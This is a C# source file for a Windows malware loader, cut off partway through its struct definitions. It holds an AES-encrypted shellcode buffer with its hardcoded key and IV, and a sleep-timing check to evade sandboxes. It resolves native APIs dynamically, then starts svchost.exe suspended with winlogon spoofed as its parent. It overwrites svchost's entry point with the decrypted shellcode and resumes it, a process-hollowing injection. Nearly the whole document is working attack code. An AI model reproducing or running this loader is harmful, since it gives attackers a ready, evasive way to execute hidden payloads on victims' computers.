using System;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace exe
{
    class Program
    {
    	
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
        static void Main(string[] args)
        {
		
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.5)
            {
                return;
            }
            bool x64;
            if (IntPtr.Size == 8)
            {
                x64 = true;
            }
            else
            {
                x64 = false;
            }
            string MyKey = "C9-DD-38-D0-2B-09-ED-D1-67-4F-C2-67-6F-38-0C-49-E4-B8-F8-E2-51-2F-41-87-F1-A5-68-83-08-21-78-22";
            string Myiv = "A1-91-B4-96-90-12-AE-F9-53-87-13-5C-7A-0F-A1-23";
            byte[] buf = new byte[1536] {0xd9, 0x26, 0x42, 0xfd, 0x32, 0x50, 0x15, 0x0d, 0x9d, 0x0a, 0x8a, 0xed, 0xce, 0x90, 0x4c, 0x78, 0xc5, 0x16, 0x71, 0x3a, 0x9c, 0xbc, 0x5d, 0x53, 0x3e, 0x2a, 0x41, 0x5c, 0x4f, 0xee, 0xc3, 0xb7, 0x68, 0x9e, 0xfa, 0x66, 0x69, 0x36, 0x38, 0xee, 0x6e, 0x7b, 0x9e, 0xfc, 0xaa, 0x33, 0x7a, 0x5e, 0x35, 0xb9, 0xb5, 0x12, 0x63, 0x90, 0x19, 0xa0, 0x6a, 0x52, 0x7a, 0xae, 0x8b, 0xe8, 0x6f, 0xf3, 0x4b, 0x48, 0x23, 0xe2, 0x51, 0x4c, 0x58, 0x87, 0x0c, 0xde, 0x87, 0x96, 0x71, 0xb6, 0x47, 0xf9, 0x75, 0x45, 0x9c, 0x8c, 0x15, 0x4d, 0xec, 0x12, 0x1a, 0xee, 0xf3, 0x42, 0x76, 0xe2, 0x1e, 0x40, 0x20, 0xab, 0x35, 0xda, 0xb7, 0x89, 0x8a, 0xab, 0x69, 0x48, 0x83, 0xad, 0x28, 0x3b, 0x0e, 0x01, 0xba, 0x3d, 0xb1, 0xdc, 0x9b, 0x31, 0xd0, 0xc1, 0x41, 0xd2, 0x87, 0x56, 0xb4, 0xb6, 0xec, 0x28, 0x65, 0x8e, 0x53, 0xd1, 0xc9, 0x51, 0x6d, 0x8b, 0xd8, 0x33, 0xce, 0xb8, 0x6f, 0xc6, 0x49, 0xc4, 0xa9, 0x6c, 0x3f, 0x24, 0x8c, 0x27, 0x57, 0xcd, 0x3e, 0x21, 0x8c, 0xe6, 0x41, 0x64, 0x66, 0xd4, 0x1f, 0x7f, 0x10, 0xbf, 0x54, 0x8c, 0xb4, 0x77, 0xb3, 0xba, 0x3e, 0xd1, 0xbd, 0xfb, 0xac, 0x5d, 0xfd, 0x48, 0xdf, 0x53, 0xe2, 0x02, 0xfa, 0x10, 0xf7, 0x07, 0xd8, 0x10, 0xb0, 0x59, 0x3b, 0x46, 0x5c, 0xea, 0xad, 0x3e, 0x33, 0x67, 0xc4, 0x9b, 0x38, 0xcf, 0x04, 0x67, 0xc6, 0x1d, 0x08, 0x50, 0xf4, 0xab, 0x53, 0x54, 0xc2, 0xb4, 0xb3, 0xef, 0x88, 0x85, 0x99, 0x35, 0x4f, 0x8a, 0x12, 0x45, 0x64, 0x0b, 0x1a, 0x63, 0x9e, 0x48, 0x79, 0xe3, 0x30, 0x11, 0x56, 0xf4, 0x53, 0xa5, 0x66, 0xe9, 0x2b, 0xc1, 0x91, 0x78, 0x31, 0xd7, 0x14, 0x25, 0xb5, 0x1f, 0xd8, 0x33, 0x30, 0x4f, 0xe0, 0xc3, 0x1c, 0x11, 0xb8, 0x05, 0x7f, 0xf0, 0x10, 0xba, 0xd5, 0xc6, 0x70, 0xfb, 0x7e, 0x1b, 0x9b, 0x4f, 0x25, 0xe5, 0x65, 0x0c, 0x03, 0x89, 0xcf, 0x62, 0x88, 0x97, 0x56, 0x32, 0x2a, 0x94, 0x70, 0x4c, 0xf2, 0xfc, 0x4d, 0x4c, 0x31, 0x13, 0xa9, 0xb3, 0xf4, 0x72, 0xdd, 0x6f, 0xae, 0x82, 0xdf, 0x16, 0x4c, 0xf3, 0x8b, 0xde, 0xef, 0xc7, 0xf9, 0x50, 0x9f, 0x0c, 0x1d, 0x33, 0x2b, 0x66, 0x9a, 0x76, 0x41, 0x3f, 0x6e, 0x8d, 0x97, 0x1c, 0xbb, 0xa8, 0xee, 0xf6, 0x54, 0x41, 0xc1, 0x86, 0xf9, 0x6d, 0x10, 0xe4, 0x9c, 0x53, 0xcb, 0xb4, 0xc4, 0xf0, 0xd6, 0x43, 0xb8, 0x1e, 0xd4, 0xf1, 0x6c, 0x26, 0x67, 0xb3, 0x05, 0x84, 0x00, 0xaa, 0x23, 0x60, 0xa8, 0xae, 0x97, 0x10, 0x6b, 0x0a, 0xf9, 0xf6, 0x26, 0xd7, 0xd1, 0x7e, 0xcb, 0x30, 0xc1, 0x06, 0x49, 0x9a, 0x26, 0xba, 0x22, 0xe4, 0xab, 0x37, 0x92, 0x2a, 0xde, 0xa4, 0x9f, 0x3a, 0xed, 0x37, 0xdb, 0xb7, 0x06, 0x72, 0xd0, 0x43, 0x94, 0xa0, 0x73, 0x41, 0x3c, 0x98, 0x36, 0x01, 0x91, 0x28, 0xf0, 0x5d, 0xfe, 0x44, 0x12, 0xe7, 0x81, 0xf9, 0xa6, 0x3d, 0xc0, 0x5e, 0xd7, 0x64, 0xc0, 0xfd, 0x72, 0x75, 0xc8, 0xd5, 0xba, 0xb7, 0x00, 0xcb, 0xf8, 0x24, 0xc6, 0xc7, 0x2d, 0x07, 0x4e, 0x12, 0x3d, 0x76, 0xfd, 0x6a, 0x6d, 0x41, 0x24, 0x00, 0xba, 0x1d, 0xdc, 0xe5, 0xe1, 0x24, 0x18, 0x7e, 0xda, 0x69, 0xcc, 0xc8, 0xf5, 0x57, 0x43, 0x05, 0xf2, 0xc0, 0x91, 0xa7, 0xa3, 0xcf, 0x5d, 0x8d, 0x7a, 0x14, 0xa6, 0x18, 0x27, 0xad, 0x3b, 0xf1, 0x00, 0x26, 0xb7, 0x2f, 0xb0, 0x0b, 0x46, 0x23, 0xe2, 0x6c, 0x34, 0x3f, 0xd0, 0x14, 0xbc, 0xdf, 0xbd, 0x08, 0x1b, 0xce, 0x68, 0x01, 0x8f, 0xd1, 0xb8, 0x73, 0x09, 0x79, 0x2a, 0xe1, 0xf4, 0x23, 0x0f, 0x75, 0xd9, 0x8e, 0x79, 0x07, 0xd6, 0xf0, 0x2d, 0x40, 0xd2, 0xf4, 0xea, 0x0c, 0x96, 0x70, 0xd3, 0x8a, 0x46, 0xa9, 0x37, 0x5f, 0x66, 0x1d, 0x79, 0xc7, 0xee, 0x12, 0xf2, 0xf2, 0x78, 0x1f, 0x07, 0x49, 0x4c, 0x0a, 0x73, 0x9d, 0xe9, 0xf0, 0x25, 0x89, 0xfd, 0x9f, 0xe7, 0xa4, 0xca, 0x90, 0x07, 0x07, 0xfe, 0xc1, 0xe7, 0x61, 0xf2, 0xe4, 0xce, 0x14, 0x82, 0xaa, 0x10, 0xc3, 0xe0, 0xe7, 0x55, 0x3f, 0xfa, 0x3f, 0x12, 0x19, 0xe6, 0xf7, 0x6c, 0x2b, 0x11, 0xf0, 0x75, 0x33, 0x91, 0x3f, 0x6e, 0x9b, 0x12, 0x4a, 0x7e, 0x70, 0x6e, 0xb4, 0xcf, 0x60, 0xb0, 0x8c, 0x28, 0xd2, 0x57, 0xb9, 0xae, 0x41, 0xe4, 0x61, 0xa7, 0xcc, 0x21, 0x16, 0xd0, 0x5c, 0x6b, 0xe1, 0x46, 0x6d, 0xe1, 0x6d, 0x7d, 0x61, 0x87, 0x27, 0x7b, 0x00, 0xe0, 0x3a, 0x22, 0xfe, 0xcd, 0x4a, 0xa1, 0x09, 0x15, 0xe1, 0x7e, 0xb0, 0xe4, 0x70, 0xcc, 0xbf, 0x4d, 0xf5, 0x3e, 0x2c, 0xf0, 0x45, 0xf3, 0x25, 0xcb, 0x5f, 0x8b, 0x4a, 0xa3, 0xc7, 0xa8, 0x66, 0x57, 0xe5, 0x2e, 0x2d, 0xaf, 0xea, 0x3a, 0xa2, 0x95, 0x90, 0xf3, 0x26, 0x0f, 0x1d, 0x25, 0xa9, 0x87, 0x89, 0x5b, 0xf0, 0xcf, 0x23, 0x90, 0x1f, 0x5c, 0x8e, 0x85, 0x14, 0xe5, 0x84, 0x6d, 0x8e, 0xb7, 0x8e, 0xee, 0xd6, 0x30, 0x24, 0x76, 0x3c, 0xae, 0x84, 0x57, 0x15, 0x52, 0xf4, 0xa3, 0xff, 0x06, 0x8a, 0x67, 0x6f, 0x72, 0xd0, 0x28, 0xd8, 0xa4, 0x1a, 0x69, 0x5d, 0x27, 0xba, 0x42, 0x35, 0xe6, 0xd3, 0x39, 0x83, 0xaa, 0x24, 0xde, 0x7a, 0xad, 0xd5, 0x85, 0x8d, 0xdb, 0xca, 0xd9, 0x71, 0x45, 0x46, 0x07, 0x5d, 0x08, 0x63, 0x8a, 0xc1, 0x43, 0xd5, 0xc3, 0xf2, 0xd7, 0x39, 0x6d, 0x03, 0x76, 0xdc, 0xaa, 0x05, 0x7a, 0xb4, 0x16, 0x33, 0xbb, 0x0f, 0xc8, 0x73, 0xc0, 0xca, 0xb2, 0x48, 0xc5, 0x20, 0xd5, 0x8a, 0x8b, 0x9d, 0x22, 0xe4, 0x2d, 0xed, 0x49, 0x8c, 0x9e, 0x96, 0x10, 0x37, 0x33, 0x64, 0x8e, 0x39, 0x29, 0x6a, 0xbd, 0xc9, 0xb4, 0xdf, 0x7b, 0xd2, 0x83, 0x0a, 0x5b, 0x8a, 0x0e, 0x2e, 0xae, 0x6d, 0x9d, 0xe9, 0x05, 0xaa, 0x94, 0x30, 0xcd, 0x19, 0xbb, 0x28, 0x0d, 0x6b, 0x5f, 0x6f, 0xb0, 0x98, 0x7d, 0xc2, 0xb4, 0xb8, 0x23, 0xe4, 0x2f, 0xf8, 0xa7, 0x1b, 0x74, 0xf0, 0x57, 0x9c, 0xe5, 0x01, 0xa4, 0x69, 0xec, 0xdd, 0x36, 0xf1, 0xe0, 0x45, 0x86, 0xaa, 0x55, 0xc6, 0x4e, 0xd6, 0xe0, 0x58, 0x8a, 0x7c, 0xbf, 0xdd, 0x14, 0xc4, 0x80, 0xcd, 0x28, 0x1a, 0x90, 0x29, 0xda, 0x2d, 0xb5, 0x9d, 0xe7, 0xdb, 0xc4, 0x42, 0x41, 0xfd, 0x22, 0x74, 0x76, 0xc1, 0xa4, 0xee, 0xcc, 0x08, 0xb5, 0xa7, 0x4f, 0x3b, 0x14, 0x3f, 0x62, 0x75, 0xe0, 0x13, 0x35, 0x41, 0x98, 0xce, 0x73, 0x73, 0x23, 0x5c, 0x91, 0xad, 0xda, 0xdc, 0xc1, 0x14, 0x51, 0x83, 0xb9, 0x94, 0xfa, 0x39, 0xfc, 0x8d, 0xb4, 0x06, 0x26, 0x8b, 0xf9, 0x0a, 0xf6, 0x96, 0x8d, 0x72, 0x74, 0x65, 0x81, 0xff, 0x54, 0xfe, 0x0e, 0xe0, 0x6d, 0xfe, 0xad, 0xb5, 0x44, 0xb1, 0x4a, 0xb7, 0x43, 0xfe, 0xdb, 0x7a, 0x49, 0x36, 0xc3, 0x2f, 0x76, 0xec, 0x76, 0x5f, 0xa4, 0xea, 0x26, 0x10, 0xb2, 0xcd, 0x0d, 0xb3, 0x68, 0xe9, 0xd1, 0x80, 0x30, 0xf6, 0xe1, 0xda, 0x1b, 0xb0, 0xe0, 0x9b, 0x97, 0xb4, 0xdc, 0xb7, 0xbd, 0x8d, 0x93, 0xbc, 0x7a, 0x69, 0x75, 0x65, 0x6d, 0xaa, 0xf7, 0x79, 0x37, 0x25, 0x55, 0x9d, 0xb2, 0x54, 0x66, 0xe6, 0x6e, 0xeb, 0x4a, 0x0e, 0x6d, 0xc7, 0x7d, 0x0d, 0x86, 0xaa, 0xa8, 0x40, 0x32, 0xd5, 0xb4, 0xcd, 0x04, 0x94, 0xd1, 0xfc, 0x3d, 0x53, 0xe3, 0x00, 0x28, 0xb4, 0x14, 0x87, 0xaf, 0xf7, 0x3a, 0x18, 0x73, 0x2b, 0x1a, 0xb4, 0x09, 0x04, 0x1f, 0x0b, 0x15, 0x98, 0x1f, 0xe1, 0xbd, 0xa1, 0xf1, 0x21, 0x98, 0x5c, 0x3e, 0x98, 0x00, 0x38, 0xa1, 0x9d, 0xf8, 0x81, 0xfe, 0xf0, 0x0d, 0xd5, 0xa9, 0x29, 0x77, 0xf1, 0xc0, 0x69, 0xbb, 0xc1, 0xef, 0x8a, 0xa3, 0x14, 0x91, 0xad, 0x2a, 0x3b, 0x44, 0x15, 0xe5, 0x1f, 0xbb, 0x16, 0xe5, 0x5d, 0x96, 0xf7, 0x7b, 0x8b, 0x84, 0x44, 0xff, 0xd0, 0x6f, 0x9e, 0x40, 0x52, 0x18, 0xa6, 0xd5, 0x24, 0x51, 0x02, 0x80, 0x18, 0xed, 0xed, 0x0f, 0x51, 0xa9, 0xba, 0x2c, 0x51, 0xe8, 0x4f, 0xa6, 0x4f, 0xaa, 0xce, 0xdd, 0x1b, 0xe5, 0x7b, 0x8f, 0x60, 0xfb, 0x03, 0x15, 0x92, 0xde, 0x0a, 0x8f, 0xb5, 0x15, 0xf6, 0x8e, 0xd4, 0x2e, 0x32, 0x1f, 0xbc, 0x82, 0x88, 0x18, 0x91, 0xb1, 0x30, 0x7c, 0xfd, 0xb8, 0x96, 0x8f, 0x2f, 0xfa, 0xdb, 0xb5, 0xcb, 0x22, 0xda, 0x4c, 0x9c, 0x0a, 0xb7, 0xd3, 0xb5, 0x63, 0x6d, 0x1c, 0x9b, 0xb7, 0x27, 0x7e, 0xfe, 0xfa, 0x9e, 0xde, 0xd2, 0xf0, 0x58, 0xc4, 0x24, 0x2c, 0x1b, 0x25, 0x12, 0xe6, 0xd9, 0x1d, 0xae, 0xde, 0xa4, 0xfc, 0x8f, 0x41, 0xb8, 0xd4, 0x2d, 0x89, 0x06, 0xfd, 0x39, 0x54, 0x4f, 0xba, 0xcc, 0xdc, 0x34, 0x30, 0x53, 0x3a, 0x1b, 0x43, 0xde, 0xa0, 0xc1, 0xf2, 0x3c, 0x26, 0xf7, 0x1c, 0x56, 0x90, 0x33, 0x39, 0x7f, 0x05, 0x44, 0x86, 0xce, 0xec, 0x1a, 0x92, 0x8c, 0x11, 0x4b, 0x86, 0x2d, 0x23, 0xc4, 0x45, 0xd5, 0x64, 0xa2, 0x74, 0xd2, 0xbf, 0x2f, 0xfb, 0x06, 0x82, 0x84, 0x05, 0xb4, 0x3a, 0x63, 0x5c, 0x01, 0xe7, 0x25, 0x6c, 0x29, 0xf4, 0xbc, 0x4f, 0x33, 0xa8, 0xee, 0xaf, 0x5d, 0xe9, 0xd9, 0xbf, 0x14, 0x4b, 0xa3, 0xb0, 0x08, 0xf5, 0x8a, 0x40, 0x29, 0xfa, 0x93, 0x13, 0x03, 0x4a, 0x8d, 0xd5, 0x13, 0xf9, 0x7f, 0xc5, 0x43, 0x06, 0x89, 0x02, 0x82, 0x7a, 0xb7, 0xdd, 0xf6, 0x67, 0x78, 0x9e, 0x3b, 0xe4, 0x69, 0x4a, 0xfc, 0x80, 0x47, 0xce, 0x0e, 0xca, 0x27, 0xbe, 0xfc, 0xe6, 0xe9, 0xcd, 0x6a, 0xf6, 0x57, 0x6a, 0xb6, 0x04, 0x53, 0xba, 0xe2, 0x18, 0x98, 0xa9, 0x67, 0x04, 0x34, 0x20, 0x54, 0xe4, 0x50, 0x16, 0xdc, 0x2b, 0x76, 0x87, 0xb0, 0xad, 0x8b, 0xf8, 0x86, 0x3c, 0x98, 0xcd, 0x55, 0xb4, 0x66, 0x61, 0x31, 0x5d, 0x01, 0x99, 0xd1, 0x92, 0xf7, 0xfe, 0x9a, 0x73, 0x13, 0x9e, 0x28, 0x6e, 0xf0, 0xea, 0x30, 0xc2, 0xa6, 0x63, 0x76, 0x84, 0xd0, 0x27, 0x7f, 0x1c, 0xea, 0xf2, 0x20, 0x01, 0x16, 0x5a, 0xea, 0xa5, 0xa4, 0x26, 0x14, 0x27, 0xc5, 0x70, 0x42, 0x1d, 0xb4, 0xd5, 0xc8, 0xdd, 0x05, 0x34, 0xf2, 0x31, 0x4a, 0xae, 0x1e, 0xce, 0xa2, 0xc1, 0xea, 0x6f, 0x81, 0xd6, 0x47, 0x8c, 0x7f, 0x76, 0x5d, 0xdd, 0xc3, 0xbd, 0x23, 0x38, 0xed, 0xda, 0x3c, 0x45, 0x20, 0xc3, 0x0c, 0xab, 0x50, 0x96, 0xe5, 0xb1, 0xe4, 0x16, 0x4e, 0xad, 0x48, 0x1d, 0xce, 0x3f, 0x1a, 0x2d, 0x64, 0x07, 0xe6, 0xf9, 0x4a, 0x61, 0xe3, 0x5d, 0x1f, 0x55, 0x6f, 0x88, 0x8f, 0x77, 0x03, 0x86, 0xf1, 0xa2, 0x4b, 0xe1, 0xb8, 0xa9, 0x2b, 0x5a, 0x11, 0xbb, 0x39, 0x4e, 0x1b, 0xd3, 0xbe, 0xe4, 0xb5, 0x65, 0xa4, 0x89, 0xd6, 0xc7, 0x63, 0x5a, 0xb9, 0x1a, 0x44, 0x9d, 0xbf, 0x04, 0xa7, 0x93, 0x0f, 0xa8, 0x41, 0x6b, 0x1a, 0x00, 0x56, 0xd4, 0xc9, 0x19, 0xb3, 0x72, 0xf0, 0x0b, 0x91, 0x49, 0x68, 0x06, 0xa2, 0x8c, 0x71, 0xfb, 0xca, 0xe3, 0xcc, 0x5a, 0xd9, 0x13, 0x19, 0xc0, 0xea, 0x9b, 0x43, 0x39, 0x76, 0x5b, 0x67};
            //Convert key to bytes
            string[] c1 = MyKey.Split('-');
            byte[] f = new byte[c1.Length];
            for (int i = 0; i < c1.Length; i++) f[i] = Convert.ToByte(c1[i], 16);
            //Convert IV to bytes
            string[] d1 = Myiv.Split('-');
            byte[] g = new byte[d1.Length];
            for (int i = 0; i < d1.Length; i++) g[i] = Convert.ToByte(d1[i], 16);

            string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
            // Remove dashes from string
            string[] roundnodash = roundtrip.Split('-');
            // Convert Decrypted shellcode back to bytes
            byte[] e = new byte[roundnodash.Length];
            for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);

            IntPtr pointer = Invoke.GetLibraryAddress("kernel32.dll", "CreateProcessA");
            DELEGATES.CreateProcess CreateProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "InitializeProcThreadAttributeList", false, true);
            DELEGATES.InitializeProcThreadAttributeList InitializeProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.InitializeProcThreadAttributeList)) as DELEGATES.InitializeProcThreadAttributeList;

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "UpdateProcThreadAttribute", false, true);
            DELEGATES.UpdateProcThreadAttribute UpdateProcThreadAttribute = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.UpdateProcThreadAttribute)) as DELEGATES.UpdateProcThreadAttribute;

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "DeleteProcThreadAttributeList", false, true);
            DELEGATES.DeleteProcThreadAttributeList DeleteProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.DeleteProcThreadAttributeList)) as DELEGATES.DeleteProcThreadAttributeList;

            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "ZwQueryInformationProcess");
            DELEGATES.ZwQueryInformationProcess ZwQueryInformationProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ZwQueryInformationProcess)) as DELEGATES.ZwQueryInformationProcess;

            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtReadVirtualMemory");
            DELEGATES.NtReadVirtualMemory NtReadVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtReadVirtualMemory)) as DELEGATES.NtReadVirtualMemory;

            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtProtectVirtualMemory");
            DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtProtectVirtualMemory)) as DELEGATES.NtProtectVirtualMemory;

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "ResumeThread");
            DELEGATES.ResumeThread ResumeThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;

            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtWriteVirtualMemory");
            DELEGATES.NtWriteVirtualMemory NtWriteVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtWriteVirtualMemory)) as DELEGATES.NtWriteVirtualMemory;


            STRUCTS.STARTUPINFOEX si = new STRUCTS.STARTUPINFOEX();
            STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();
            si.StartupInfo.cb = (uint)Marshal.SizeOf(si);
            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            try
            {
                STRUCTS.SECURITY_ATTRIBUTES lpa = new STRUCTS.SECURITY_ATTRIBUTES();
                STRUCTS.SECURITY_ATTRIBUTES lta = new STRUCTS.SECURITY_ATTRIBUTES();
                lpa.nLength = Marshal.SizeOf(lpa);
                lta.nLength = Marshal.SizeOf(lta);

                var lpSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, ref lpSize);

                if (x64)
                {
                    Marshal.WriteIntPtr(lpValue, new IntPtr((long)0x300000000000)); //BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE
                }
                else
                {
                    Marshal.WriteIntPtr(lpValue, new IntPtr(unchecked((uint)0x300000000000)));
                }

                UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr)STRUCTS.ProcThreadAttribute.MITIGATION_POLICY, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                var parentHandle = Process.GetProcessesByName("winlogon")[0].Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr)STRUCTS.ProcThreadAttribute.PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                CreateProcess(null, "c:\\windows\\system32\\svchost.exe", ref lpa, ref lta, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED | STRUCTS.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref si, out pi);
            }
            catch (Exception error)
            {
                Console.Error.WriteLine("error" + error.StackTrace);
            }
            finally
            {
                DeleteProcThreadAttributeList(si.lpAttributeList);
                Marshal.FreeHGlobal(si.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }
            STRUCTS.PROCESS_BASIC_INFORMATION pbi = new STRUCTS.PROCESS_BASIC_INFORMATION();
            uint temp = 0;
            UInt32 success = ZwQueryInformationProcess(pi.hProcess, 0x0, ref pbi, (uint)(IntPtr.Size * 6), ref temp);
            IntPtr ptrToImageBase;
            if (x64)
            {
                ptrToImageBase = (IntPtr)((Int64)pbi.PebBaseAddress + 0x10);
            }
            else
            {
                ptrToImageBase = (IntPtr)((Int32)pbi.PebBaseAddress + 0x8);
            }
            byte[] addrBuf = new byte[IntPtr.Size];
            UInt32 nread = 0;
            NtReadVirtualMemory(pi.hProcess, ptrToImageBase, addrBuf, (uint)addrBuf.Length, ref nread);
            IntPtr svchostBase;
            if (x64)
            {
                svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            }
            else
            {
                svchostBase = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            }
            byte[] data = new byte[0x200];
            NtReadVirtualMemory(pi.hProcess, svchostBase, data, (uint)data.Length, ref nread);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint;
            if (x64)
            {
                addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            }
            else
            {
                addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt32)svchostBase);
            }
            UInt32 nread2 = 0;
            IntPtr bufferlength = new IntPtr(e.Length);
            UInt32 oldprotect = 0;
            NtProtectVirtualMemory.DynamicInvoke(pi.hProcess, addressOfEntryPoint, bufferlength, 0x4, oldprotect);
            NtWriteVirtualMemory.DynamicInvoke(pi.hProcess, addressOfEntryPoint, e, (UInt32)e.Length, nread2);
NtProtectVirtualMemory.DynamicInvoke(pi.hProcess, addressOfEntryPoint, bufferlength, 0x20, oldprotect);
            ResumeThread(pi.hThread); 
        }
	
        static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                    throw new ArgumentNullException("Key");
                if (IV == null || IV.Length <= 0)
                    throw new ArgumentNullException("IV");
                string plaintext = null;
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Key = Key;
                    aesAlg.IV = IV;
                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                    using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                            {
                                plaintext = srDecrypt.ReadToEnd();
                            }
                        }
                    }
                }
                return plaintext;
        }
            
    }
    
     public class DELEGATES
        {
            //hollowing delegates
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate Boolean CreateProcess(string lpApplicationName, string lpCommandLine, ref STRUCTS.SECURITY_ATTRIBUTES lpProcessAttributes, ref STRUCTS.SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STRUCTS.STARTUPINFOEX lpStartupInfo, out STRUCTS.PROCESS_INFORMATION lpProcessInformation);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 ZwQueryInformationProcess(IntPtr hProcess, Int32 procInformationClass, ref STRUCTS.PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate STRUCTS.NTSTATUS InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate STRUCTS.NTSTATUS UpdateProcThreadAttribute(IntPtr lpAttributeList, STRUCTS.ProcessCreationFlags dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate STRUCTS.NTSTATUS DeleteProcThreadAttributeList(IntPtr lpAttributeList);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, Int32 NewProtect, ref UInt32 OldProtect);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, Byte[] Buffer, UInt32 NumberOfBytesToRead, ref UInt32 NumberOfBytesRead);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint ResumeThread(IntPtr hThhread);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, Byte[] Buffer, UInt32 BufferLength, ref UInt32 BytesWritten);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtQueryInformationProcess(IntPtr processHandle, STRUCTS.PROCESSINFOCLASS processInformationClass, IntPtr processInformation, int processInformationLength, ref UInt32 returnLength);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void RtlZeroMemory(IntPtr Destination, int length);
        }

    public class STRUCTS
    {
        [Flags]
        public enum ProcessCreationFlags : uint
        {
            CREATE_SUSPENDED = 0x00000004,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        }
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        public struct PROCESS_BASIC_INFORMATION
        {
            public STRUCTS.NTSTATUS ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
